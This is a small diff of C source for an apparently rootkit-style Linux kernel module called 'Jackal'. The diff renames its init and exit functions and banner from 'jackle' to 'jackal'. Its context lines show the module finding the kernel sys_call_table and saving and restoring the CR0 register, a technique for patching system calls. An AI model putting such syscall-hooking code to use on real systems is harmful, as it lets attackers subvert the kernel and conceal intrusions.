@@ -45,9 +45,9 @@ static unsigned long **aquire_sys_call_table( void ) {
     return NULL;
 }
 
-static int __init jackle_start( void ) {
+static int __init jackal_start( void ) {
     
-    printk( KERN_INFO "[+]  J A C K E L\n" );
+    printk( KERN_INFO "[+]  J A C K A L\n" );
     if( !( sys_call_table = aquire_sys_call_table() ) )
         return -1;
     original_cr0 = read_cr0();
@@ -69,7 +69,7 @@ static int __init jackle_start( void ) {
     return 0;
 }
 
-static void __exit jackle_end( void ) {
+static void __exit jackal_end( void ) {
     if( !sys_call_table ) {
         return;
     }
@@ -79,5 +79,5 @@ static void __exit jackle_end( void ) {
     write_cr0( original_cr0 );
 }
 
-module_init( jackle_start );
-module_exit( jackle_end );
+module_init( jackal_start );
+module_exit( jackal_end );
